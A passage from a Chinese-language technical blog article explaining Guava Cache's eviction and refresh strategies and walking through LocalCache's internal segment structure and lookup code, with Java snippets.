<pre><code class="hljs language-scss" lang="scss">Cache&lt;<span class="hljs-selector-tag">Object</span>, <span class="hljs-selector-tag">Object</span>&gt; cache = CacheBuilder<span class="hljs-selector-class">.newBuilder</span>()
    <span class="hljs-comment">// 10分钟没有访问后会被回收，或者重新加载</span>
    <span class="hljs-selector-class">.expireAfterAccess</span>(<span class="hljs-number">10</span>, TimeUnit.MINUTES)
    <span class="hljs-comment">// 5分钟没有更新,缓存会被回收，或者重新加载</span>
    <span class="hljs-comment">// .expireAfterWrite(5,TimeUnit.MINUTES)</span>
<span class="hljs-selector-class">.build</span>();
</code></pre>
<h3 data-id="heading-6">2.3 基于引用回收策略</h3>
<p>Guava Cache 提供了以下三个方法来配置基于引用的回收策略：</p>
<ol>
<li>
<p><strong>weakKeys() 方法：</strong></p>
<p>通过调用 <code>weakKeys()</code> 方法，可以使缓存中的键使用弱引用。这意味着如果某个键没有其他强引用指向它，那么该键可能会被垃圾回收，并且相应的缓存项也会被移除。</p>
</li>
</ol>

<pre><code class="hljs language-ini" lang="ini">   Cache&lt;Object, Object&gt; <span class="hljs-attr">cache</span> = CacheBuilder.newBuilder()
       .weakKeys()
       .build()<span class="hljs-comment">;</span>
</code></pre>
<ol>
<li>
<p><strong>weakValues() 方法：</strong></p>
<p>通过调用 <code>weakValues()</code> 方法，可以使缓存中的值使用弱引用。这样，如果某个值没有其他强引用指向它，那么该值可能会被垃圾回收，相应的缓存项也会被移除。</p>
</li>
</ol>

<pre><code class="hljs language-ini" lang="ini">   Cache&lt;Object, Object&gt; <span class="hljs-attr">cache</span> = CacheBuilder.newBuilder()
       .weakValues()
       .build()<span class="hljs-comment">;</span>
</code></pre>
<ol>
<li>
<p><strong>softValues() 方法：</strong></p>
<p>通过调用 <code>softValues()</code> 方法，可以使缓存中的值使用软引用。软引用相对于弱引用，更倾向于在内存不足时被垃圾回收。如果某个值没有其他强引用指向它，且内存不足时，该值可能会被垃圾回收，相应的缓存项也会被移除。</p>
</li>
</ol>

<pre><code class="hljs language-ini" lang="ini">   Cache&lt;Object, Object&gt; <span class="hljs-attr">cache</span> = CacheBuilder.newBuilder()
       .softValues()
       .build()<span class="hljs-comment">;</span>
</code></pre>
<p>一般来讲，我们在生产环境使用的是(<strong>基于容量回收策略 + 基于时间的回收策略</strong>)两者配合来使用。</p>
<p>当然 ，我们同样可以使用<strong>手工回收</strong>的方式。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Cache</span>&lt;<span class="hljs-title class_">String</span>,<span class="hljs-title class_">String</span>&gt; cache = <span class="hljs-title class_">CacheBuilder</span>.<span class="hljs-title function_">newBuilder</span>().<span class="hljs-title function_">build</span>();
<span class="hljs-title class_">Object</span> value = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
cache.<span class="hljs-title function_">put</span>(<span class="hljs-string">"key1"</span>,<span class="hljs-string">"value1"</span>);
cache.<span class="hljs-title function_">put</span>(<span class="hljs-string">"key2"</span>,<span class="hljs-string">"value2"</span>);
cache.<span class="hljs-title function_">put</span>(<span class="hljs-string">"key3"</span>,<span class="hljs-string">"value3"</span>);

<span class="hljs-comment">//1.清除指定的key</span>
cache.<span class="hljs-title function_">invalidate</span>(<span class="hljs-string">"key1"</span>);

<span class="hljs-comment">//2.批量清除list中全部key对应的记录</span>
<span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;<span class="hljs-title class_">String</span>&gt;();
list.<span class="hljs-title function_">add</span>(<span class="hljs-string">"key1"</span>);
list.<span class="hljs-title function_">add</span>(<span class="hljs-string">"key2"</span>);
cache.<span class="hljs-title function_">invalidateAll</span>(list);
</code></pre>
<h2 data-id="heading-7">3 刷新策略</h2>
<h3 data-id="heading-8">3.1 手工刷新</h3>
<p>我们可以强制缓存加载器重新加载键的新值，调用 LoadingCache 对象的刷新方法。</p>
<pre><code class="hljs language-ini" lang="ini">String <span class="hljs-attr">value</span> = loadingCache.get(<span class="hljs-string">"key"</span>)<span class="hljs-comment">;</span>
loadingCache.refresh("key")<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-9">3.2 自动刷新</h3>
<p>Guava Cache 提供了刷新（refresh）机制，可以通过 <code>refreshAfterWrite</code> 方法来设置刷新时间，当缓存项过期的同时可以重新加载新值。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title class_">Cache</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">String</span>&gt; cache = <span class="hljs-title class_">CacheBuilder</span>.<span class="hljs-title function_">newBuilder</span>()
    .<span class="hljs-title function_">refreshAfterWrite</span>(<span class="hljs-number">5</span>, <span class="hljs-title class_">TimeUnit</span>.<span class="hljs-property">MINUTES</span>)
     <span class="hljs-comment">// 设置并发级别为3，并发级别是指可以同时写缓存的线程数</span>
    .<span class="hljs-title function_">concurrencyLevel</span>(<span class="hljs-number">3</span>)
    .<span class="hljs-title function_">build</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheLoader</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">String</span>&gt;() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">load</span>(<span class="hljs-title class_">String</span> key) throws <span class="hljs-title class_">Exception</span> {
            <span class="hljs-comment">// 异步加载新值的逻辑</span>
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetchDataFromDataSource</span>(key);
        }
    });
<span class="hljs-comment">// 在获取缓存值时，如果缓存项过期，将返回旧值 </span>
<span class="hljs-title class_">String</span> value = cache.<span class="hljs-title function_">get</span>(<span class="hljs-string">"exampleKey"</span>);
</code></pre>
<p>配置刷新方法 <code>refreshAfterWrite</code>，当大量线程同时访问缓存项，缓存已过期时，更新线程调用 load 方法更新该缓存，其他请求线程并不需要等待，框架直接返回该缓存项的旧值。</p>
<p>因为更新线程同时也是请求线程，所以在上面的示例代码里面，刷新缓存是个同步操作，可不可以异步的加载缓存呢 ？</p>
<p>我们有两种方式：<strong>异步加载缓存的原理是重写 reload 方法</strong>。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAnsynRefreshMethod1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException, ExecutionException {
      <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executorService</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">5</span>);
      CacheLoader&lt;String, String&gt; cacheLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheLoader</span>&lt;String, String&gt;() {
          <span class="hljs-comment">//自动写缓存数据的方法</span>
          <span class="hljs-meta">@Override</span>
          <span class="hljs-keyword">public</span> String <span class="hljs-title function_">load</span><span class="hljs-params">(String key)</span> {
              System.out.println(Thread.currentThread().getName() + <span class="hljs-string">" 加载 key:"</span> + key);
              <span class="hljs-comment">// 从数据库加载数据</span>
              <span class="hljs-keyword">return</span><span class="hljs-string">"value_"</span> + key.toUpperCase();
          }

          <span class="hljs-meta">@Override</span>
          <span class="hljs-comment">//异步刷新缓存</span>
          <span class="hljs-keyword">public</span> ListenableFuture&lt;String&gt; <span class="hljs-title function_">reload</span><span class="hljs-params">(String key, String oldValue)</span> <span class="hljs-keyword">throws</span> Exception {
              ListenableFutureTask&lt;String&gt; futureTask = ListenableFutureTask.create(() -&gt; {
                  System.out.println(Thread.currentThread().getName() + <span class="hljs-string">" 异步加载 key:"</span> + key + <span class="hljs-string">" oldValue:"</span> + oldValue);
                  Thread.sleep(<span class="hljs-number">1000</span>);
                  <span class="hljs-keyword">return</span> load(key);
              });
              executorService.submit(futureTask);
              <span class="hljs-keyword">return</span> futureTask;
          }
      };

      LoadingCache&lt;String, String&gt; cache = CacheBuilder.newBuilder()
              <span class="hljs-comment">// 最大容量为20（基于容量进行回收）</span>
              .maximumSize(<span class="hljs-number">20</span>)
              <span class="hljs-comment">//配置写入后多久刷新缓存</span>
              .refreshAfterWrite(<span class="hljs-number">2</span>, TimeUnit.SECONDS).build(cacheLoader);

       <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello"</span>;
       <span class="hljs-comment">// 第一次加载</span>
       <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cache.get(key);
       System.out.println(value);
       Thread.sleep(<span class="hljs-number">3000</span>);
      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
          executorService.execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() {
              <span class="hljs-meta">@Override</span>
              <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
                  <span class="hljs-keyword">try</span> {
                      <span class="hljs-type">String</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> cache.get(key);
                      System.out.println(Thread.currentThread().getName() + value2);
                      <span class="hljs-comment">// 第二次加载</span>
                  } <span class="hljs-keyword">catch</span> (Exception e) {
                       e.printStackTrace();
                  }
              }
          });
      }
      Thread.sleep(<span class="hljs-number">20000</span>);
}
</code></pre>
<p>或者使用更优雅的使用方式：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title class_">ExecutorService</span> executorService = <span class="hljs-title class_">Executors</span>.<span class="hljs-title function_">newFixedThreadPool</span>(<span class="hljs-number">5</span>);
<span class="hljs-title class_">CacheLoader</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">String</span>&gt; cacheLoader = <span class="hljs-title class_">CacheLoader</span>.<span class="hljs-title function_">asyncReloading</span>(
           <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheLoader</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">String</span>&gt;() {
                  <span class="hljs-comment">//自动写缓存数据的方法</span>
                  <span class="hljs-meta">@Override</span>
                  <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">load</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> key</span>) {
                      <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-title class_">Thread</span>.<span class="hljs-title function_">currentThread</span>().<span class="hljs-title function_">getName</span>() + <span class="hljs-string">" 加载 key:"</span> + key);
                      <span class="hljs-comment">// 从数据库加载数据</span>
                      <span class="hljs-keyword">return</span> <span class="hljs-string">"value_"</span> + key.<span class="hljs-title function_">toUpperCase</span>();
                  }
            } , executorService);
</code></pre>
<p>自动刷新的缺点是：当缓存项到了指定过期时间，不管是同步刷新还是异步刷新，绝大部分请求线程都会返回旧的数据值，缓存值会有一定的延迟效果。</p>
<p>所以一般场景下，使用<code>efreshAfterWrite</code>和 <code>expireAfterWrite</code>配合使用 。</p>
<p>比如说控制缓存每1秒进行刷新，如果超过 2s 没有访问，那么则让缓存失效，访问时不会得到旧值，而是必须得待新值加载。</p>
<h2 data-id="heading-10">4 实现原理</h2>
<p>Guava Cache 的数据结构跟 JDK1.7 的 ConcurrentHashMap 类似，如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c665ac18e3447c288a6af718ab15597~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768286698&amp;x-signature=tfwT8zNEbtb5kf%2Fuoultv4KV%2Bn8%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-11">4.1 构造函数</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> &lt;<span class="hljs-variable constant_">K1</span> <span class="hljs-keyword">extends</span> K, <span class="hljs-variable constant_">V1</span> <span class="hljs-keyword">extends</span> V&gt; <span class="hljs-title class_">LoadingCache</span>&lt;<span class="hljs-variable constant_">K1</span>, <span class="hljs-variable constant_">V1</span>&gt; <span class="hljs-title function_">build</span>(<span class="hljs-params">
      CacheLoader&lt;? <span class="hljs-variable language_">super</span> K1, V1&gt; loader</span>) {
   <span class="hljs-title function_">checkWeightWithWeigher</span>();
   <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LocalCache</span>.<span class="hljs-property">LocalLoadingCache</span>&lt;&gt;(<span class="hljs-variable language_">this</span>, loader);
}
</code></pre>
<p>通过构造器 <code>CacheBuilder</code> 的构建方法创建本地缓存类 <code>LocalCache</code> 的静态包装类 <code>LocalLoadingCache</code>对象。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalCache</span>&lt;K, V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMap</span>&lt;K, V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConcurrentMap</span>&lt;K, V&gt; {
   <span class="hljs-comment">// ..... 省略代码 </span>
   staticclass LocalLoadingCache&lt;K, V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LocalManualCache</span>&lt;K, V&gt;
      <span class="hljs-keyword">implements</span> <span class="hljs-title class_">LoadingCache</span>&lt;K, V&gt; {
    
    LocalLoadingCache(
        CacheBuilder&lt;? <span class="hljs-built_in">super</span> K, ? <span class="hljs-built_in">super</span> V&gt; builder, CacheLoader&lt;? <span class="hljs-built_in">super</span> K, V&gt; loader) {
      <span class="hljs-built_in">super</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LocalCache</span>&lt;K, V&gt;(builder, checkNotNull(loader)));
    }
    <span class="hljs-comment">// LoadingCache methods</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">get</span><span class="hljs-params">(K key)</span> <span class="hljs-keyword">throws</span> ExecutionException {
      <span class="hljs-keyword">return</span> localCache.getOrLoad(key);
    }
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">getUnchecked</span><span class="hljs-params">(K key)</span> {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">return</span> get(key);
      } <span class="hljs-keyword">catch</span> (ExecutionException e) {
        thrownew <span class="hljs-title function_">UncheckedExecutionException</span><span class="hljs-params">(e.getCause()</span>);
      }
    }
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ImmutableMap&lt;K, V&gt; <span class="hljs-title function_">getAll</span><span class="hljs-params">(Iterable&lt;? extends K&gt; keys)</span> <span class="hljs-keyword">throws</span> ExecutionException {
      <span class="hljs-keyword">return</span> localCache.getAll(keys);
    }
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refresh</span><span class="hljs-params">(K key)</span> {
      localCache.refresh(key);
    }
   <span class="hljs-comment">// ..... 省略代码 </span>
  }
}
</code></pre>
<p><code>LocalLoadingCache</code> 类对外暴露了若干方法，它的底层依然是 <code>LocalCache</code> 对象来执行相关缓存操作，<code>LocalCache</code> 本质上就是一个 Map 。</p>
<h3 data-id="heading-12">4.2 初始化缓存</h3>
<pre><code class="hljs language-ini" lang="ini">LocalCache(
      CacheBuilder&lt;? super K, ? super V&gt; builder, @Nullable CacheLoader&lt;? super K, V&gt; loader) {
    <span class="hljs-attr">concurrencyLevel</span> = Math.min(builder.getConcurrencyLevel(), MAX_SEGMENTS)<span class="hljs-comment">;</span>
    // key的强度，即引用类型的强弱
    <span class="hljs-attr">keyStrength</span> = builder.getKeyStrength()<span class="hljs-comment">;</span>
    // value的强度，即引用类型的强弱
    <span class="hljs-attr">valueStrength</span> = builder.getValueStrength()<span class="hljs-comment">;</span>
    // key的比较策略，跟key的引用类型有关
    <span class="hljs-attr">keyEquivalence</span> = builder.getKeyEquivalence()<span class="hljs-comment">;</span>
    // value的比较策略，跟value的引用类型有关
    <span class="hljs-attr">valueEquivalence</span> = builder.getValueEquivalence()<span class="hljs-comment">;</span>

    <span class="hljs-attr">maxWeight</span> = builder.getMaximumWeight()<span class="hljs-comment">;</span>
    <span class="hljs-attr">weigher</span> = builder.getWeigher()<span class="hljs-comment">;</span>
    //访问后的过期时间，设置了expireAfterAccess参数
    <span class="hljs-attr">expireAfterAccessNanos</span> = builder.getExpireAfterAccessNanos()<span class="hljs-comment">;</span>
     //写入后的过期时间，设置了expireAfterWrite参数
    <span class="hljs-attr">expireAfterWriteNanos</span> = builder.getExpireAfterWriteNanos()<span class="hljs-comment">;</span>
    <span class="hljs-attr">refreshNanos</span> = builder.getRefreshNanos()<span class="hljs-comment">;</span>

    int <span class="hljs-attr">initialCapacity</span> = Math.min(builder.getInitialCapacity(), MAXIMUM_CAPACITY)<span class="hljs-comment">;</span>
    if (evictsBySize() &amp;&amp; !customWeigher()) {
      <span class="hljs-attr">initialCapacity</span> = (int) Math.min(initialCapacity, maxWeight)<span class="hljs-comment">;</span>
    }
    // Find the lowest power-of-two segmentCount that exceeds concurrencyLevel, unless
    // maximumSize/Weight is specified in which case ensure that each segment gets at least 10
    // entries. The special casing for size-based eviction is only necessary because that eviction
    // happens per segment instead of globally, so too many segments compared to the maximum size
    // will result in random eviction behavior.
    int <span class="hljs-attr">segmentShift</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    int <span class="hljs-attr">segmentCount</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
    while (segmentCount &lt; concurrencyLevel &amp;&amp; (!evictsBySize() || segmentCount * 20 &lt;= maxWeight)) {
      ++segmentShift<span class="hljs-comment">;</span>
      segmentCount &lt;&lt;= 1<span class="hljs-comment">;</span>
    }
    <span class="hljs-attr">this.segmentShift</span> = <span class="hljs-number">32</span> - segmentShift<span class="hljs-comment">;</span>
    <span class="hljs-attr">segmentMask</span> = segmentCount - <span class="hljs-number">1</span><span class="hljs-comment">;</span>

    <span class="hljs-attr">this.segments</span> = newSegmentArray(segmentCount)<span class="hljs-comment">;</span>
    
    int <span class="hljs-attr">segmentCapacity</span> = initialCapacity / segmentCount<span class="hljs-comment">;</span>
    if (segmentCapacity * segmentCount &lt; initialCapacity) {
      ++segmentCapacity<span class="hljs-comment">;</span>
    }
    int <span class="hljs-attr">segmentSize</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
    while (segmentSize &lt; segmentCapacity) {
      segmentSize &lt;&lt;= 1<span class="hljs-comment">;</span>
    }
    if (evictsBySize()) {
      // Ensure sum of segment max <span class="hljs-attr">weights</span> = overall max weights
      long <span class="hljs-attr">maxSegmentWeight</span> = maxWeight / segmentCount + <span class="hljs-number">1</span><span class="hljs-comment">;</span>
      long <span class="hljs-attr">remainder</span> = maxWeight % segmentCount<span class="hljs-comment">;</span>
      for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; this.segments.length; ++i) {</span>
        if (<span class="hljs-attr">i</span> == remainder) {
          maxSegmentWeight--<span class="hljs-comment">;</span>
        }
        this.segments<span class="hljs-section">[i]</span> =
            createSegment(segmentSize, maxSegmentWeight, builder.getStatsCounterSupplier().get())<span class="hljs-comment">;</span>
      }
    } else {
      for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; this.segments.length; ++i) {</span>
        this.segments<span class="hljs-section">[i]</span> =
            createSegment(segmentSize, UNSET_INT, builder.getStatsCounterSupplier().get())<span class="hljs-comment">;</span>
      }
    }
}
</code></pre>
<p><code>LocalCache</code> 维护一个 Segment 数组，数组大小满足如下条件：</p>
<ol>
<li>数组大小是 2 的幂次 ，并且小于并发度 concurrencyLevel ；</li>
<li>若指定了容量大小，数组大小乘以 20 要大于缓存权重 maxWeight （假如设置容量大小最大值为40，那么 maxWeight 为 40 ）。</li>
</ol>
<p>接下来，我们看看 Segment 类的核心属性 ：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Segment</span>&lt;<span class="hljs-title class_">K</span>, <span class="hljs-title class_">V</span>&gt; <span class="hljs-title class_">extends</span> <span class="hljs-title class_">ReentrantLock</span> {
    <span class="hljs-comment">// 存活的元素大小</span>
    volatileint count;
    <span class="hljs-comment">// 存活的元素权重</span>
    long totalWeight;
    <span class="hljs-comment">//修改、更新的数量，用来做弱一致性</span>
    int modCount;
    <span class="hljs-comment">//扩容用</span>
    int threshold;
    <span class="hljs-comment">//存放Entry的数组，用来存放Entry，使用AtomicReferenceArray是因为要用CAS来保证原子性</span>
    volatile<span class="hljs-meta">@Nullable</span> <span class="hljs-type">AtomicReferenceArray</span>&lt;<span class="hljs-type">ReferenceEntry</span>&lt;<span class="hljs-type">K</span>, <span class="hljs-type">V</span>&gt;&gt; table;
     <span class="hljs-comment">//如果key是弱引用的话，那么被 GC 回收后，就会放到ReferenceQueue，要根据这个queue做一些清理工作</span>
    <span class="hljs-keyword">final</span><span class="hljs-meta">@Nullable</span> <span class="hljs-type">ReferenceQueue</span>&lt;<span class="hljs-type">K</span>&gt; keyReferenceQueue;
    <span class="hljs-comment">//如果value是弱引用的话，那么被 GC 回收后，就会放到ReferenceQueue，要根据这个queue做一些清理工作</span>
    <span class="hljs-keyword">final</span><span class="hljs-meta">@Nullable</span> <span class="hljs-type">ReferenceQueue</span>&lt;<span class="hljs-type">V</span>&gt; valueReferenceQueue;
    <span class="hljs-comment">//记录哪些entry被访问，用于accessQueue的更新。</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">Queue</span>&lt;<span class="hljs-type">ReferenceEntry</span>&lt;<span class="hljs-type">K</span>, <span class="hljs-type">V</span>&gt;&gt; recencyQueue;
    <span class="hljs-comment">// 读取次数计数器</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicInteger</span> readCount <span class="hljs-operator">=</span> new <span class="hljs-type">AtomicInteger</span>();
    <span class="hljs-comment">// 如果一个元素新写入，则会记到这个队列的尾部，用来做expire</span>
    <span class="hljs-meta">@GuardedBy</span>(<span class="hljs-string">"this"</span>)
    <span class="hljs-keyword">final</span> <span class="hljs-type">Queue</span>&lt;<span class="hljs-type">ReferenceEntry</span>&lt;<span class="hljs-type">K</span>, <span class="hljs-type">V</span>&gt;&gt; writeQueue;
    <span class="hljs-comment">//读、写都会放到这个队列，用来进行LRU替换算法</span>
    <span class="hljs-meta">@GuardedBy</span>(<span class="hljs-string">"this"</span>)
    <span class="hljs-keyword">final</span> <span class="hljs-type">Queue</span>&lt;<span class="hljs-type">ReferenceEntry</span>&lt;<span class="hljs-type">K</span>, <span class="hljs-type">V</span>&gt;&gt; accessQueue;
}
</code></pre>
<p>ReferenceEntry 有几种引用类型 ：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db25f36f81234595bc30d407e2550ae1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768286698&amp;x-signature=WQNGBaLBHdcTOMs85TLgPWd1Ht8%3D" alt="图片" loading="lazy"/></p>
<p>下图展示了 StringEntry 核心属性 ：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0610e9f087343948c292db384506d36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768286698&amp;x-signature=CLrgGL%2BGobGICRg2%2B75AeNUImac%3D" alt="图片" loading="lazy"/></p>
<blockquote>
<p>每种 Entry 对象都有 Next 属性 ，指向下一个 Entry 。对象值 valueReference 默认是一个占位符 unSet ，表示没有被设置过值。</p>
</blockquote>
<h3 data-id="heading-13">4.3 查询流程</h3>
<p>进入 LoadingCache 的 get(key) 方法 ， 如下代码所示：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 1.调用LoadingCache的getOrLoad </span>
V <span class="hljs-built_in">getOrLoad</span>(K key) throws ExecutionException {
    return <span class="hljs-built_in">get</span>(key, defaultLoader);
}
<span class="hljs-comment">// 2.计算 key 的哈希值，并判断位于哪一个段 Segment，最后通过查询</span>
V <span class="hljs-built_in">get</span>(K key, CacheLoader&lt;? super K, V&gt; loader) throws ExecutionException {
    int hash = <span class="hljs-built_in">hash</span>(checkNotNull(key));
    return <span class="hljs-built_in">segmentFor</span>(hash)<span class="hljs-selector-class">.get</span>(key, hash, loader);
}
</code></pre>
<h4 data-id="heading-14">01 计算 key 对应的哈希值</h4>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">hash</span>(<span class="hljs-variable">@Nullable</span> Object key) {
    <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">h</span> = <span class="hljs-selector-tag">keyEquivalence</span><span class="hljs-selector-class">.hash</span>(key);
    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">rehash</span>(h);
}
</code></pre>
<h4 data-id="heading-15">02 定位分段 Segment</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function">Segment&lt;K, V&gt; <span class="hljs-title">segmentFor</span><span class="hljs-params">(<span class="hljs-type">int</span> hash)</span> </span>{
   <span class="hljs-comment">// segmentMask =  segmentCount - 1</span>
   <span class="hljs-keyword">return</span> segments[(hash &gt;&gt;&gt; segmentShift) &amp; segmentMask];
}
</code></pre>
<p>第二步骤，和 ConcurrentHashMap 类似，通过哈希值计算数据存储在哪一个分段 Segment 。</p>
<h4 data-id="heading-16">03 从定位的分段查询出对象</h4>
<pre><code class="hljs language-scss" lang="scss">V <span class="hljs-built_in">get</span>(K key, int hash, CacheLoader&lt;? super K, V&gt; loader) throws ExecutionException {
      <span class="hljs-comment">// 判断 key、loader 是否为空 </span>
      <span class="hljs-built_in">checkNotNull</span>(key);
      <span class="hljs-built_in">checkNotNull</span>(loader);
      try {
        if (count != <span class="hljs-number">0</span>) { <span class="hljs-comment">// read-volatile</span>
          <span class="hljs-comment">// don't call getLiveEntry, which would ignore loading values</span>
          <span class="hljs-comment">// 根据hash定位到 table 的第一个 Entry</span>
          ReferenceEntry&lt;K, V&gt; e = <span class="hljs-built_in">getEntry</span>(key, hash);
          if (e != null) {
            <span class="hljs-comment">// 获取当前时间</span>
            long now = map<span class="hljs-selector-class">.ticker</span><span class="hljs-selector-class">.read</span>();
            <span class="hljs-comment">// 获取当前存活的 Value </span>
            V value = <span class="hljs-built_in">getLiveValue</span>(e, now);
            if (value != null) {
              <span class="hljs-comment">//记录被访问过</span>
              <span class="hljs-built_in">recordRead</span>(e, now);
              <span class="hljs-comment">//记录命中率</span>
              statsCounter<span class="hljs-selector-class">.recordHits</span>(<span class="hljs-number">1</span>);
              <span class="hljs-comment">//判断是否需要刷新，如果需要刷新，那么会去异步刷新，且返回旧值。</span>
              return <span class="hljs-built_in">scheduleRefresh</span>(e, key, hash, value, now, loader);
            }
            ValueReference&lt;K, V&gt; valueReference = e<span class="hljs-selector-class">.getValueReference</span>();
            <span class="hljs-comment">//如果 Entry 过期了且数据还在加载中，则等待直到加载完成。</span>
            if (valueReference.isLoading()) {
              return <span class="hljs-built_in">waitForLoadingValue</span>(e, key, valueReference);
            }
          }
        }
        <span class="hljs-comment">// at this point e is either null or expired;</span>
        <span class="hljs-comment">// 走到这一步表示: 之前没有写入过数据 || 数据已经过期 || 数据不是在加载中。</span>
        return <span class="hljs-built_in">lockedGetOrLoad</span>(key, hash, loader);
      } catch (ExecutionException ee) {
        Throwable cause = ee<span class="hljs-selector-class">.getCause</span>();
        if (cause instanceof Error) {
          thrownew <span class="hljs-built_in">ExecutionError</span>((Error) cause);
        } elseif (cause instanceof RuntimeException) {
          thrownew <span class="hljs-built_in">UncheckedExecutionException</span>(cause);
        }
        throw ee;
      } finally {
        <span class="hljs-built_in">postReadCleanup</span>();
      }
 }
</code></pre>
<h5 data-id="heading-17"><strong>A 定位第一个Entry</strong></h5>
<pre><code class="hljs language-ini" lang="ini">ReferenceEntry&lt;K, V&gt; getEntry(Object key, int hash) {
    for (ReferenceEntry&lt;K, V&gt; <span class="hljs-attr">e</span> = getFirst(hash)<span class="hljs-comment">; e != null; e = e.getNext()) {</span>
      // 判断哈希值
      if (e.getHash() != hash) {
        continue<span class="hljs-comment">;</span>
      }
      // 判断key
      K <span class="hljs-attr">entryKey</span> = e.getKey()<span class="hljs-comment">;</span>
      if (<span class="hljs-attr">entryKey</span> == null) {
        tryDrainReferenceQueues()<span class="hljs-comment">;</span>
        continue<span class="hljs-comment">;</span>
      }
      if (map.keyEquivalence.equivalent(key, entryKey)) {
        return e<span class="hljs-comment">;</span>
      }
    }
    returnnull<span class="hljs-comment">;</span>
}
</code></pre>
<h6 data-id="heading-18">B 从第一个 Entry 获取存活的值</h6>
<pre><code class="hljs language-scss" lang="scss">V <span class="hljs-built_in">getLiveValue</span>(ReferenceEntry&lt;K, V&gt; entry, long now) {
     if (entry.getKey() == null) {
        <span class="hljs-built_in">tryDrainReferenceQueues</span>();
        return null;
     }
     V value = entry<span class="hljs-selector-class">.getValueReference</span>()<span class="hljs-selector-class">.get</span>();
     if (value == null) {
       <span class="hljs-built_in">tryDrainReferenceQueues</span>();
       return null;
     }
     if (map.isExpired(entry, now)) {
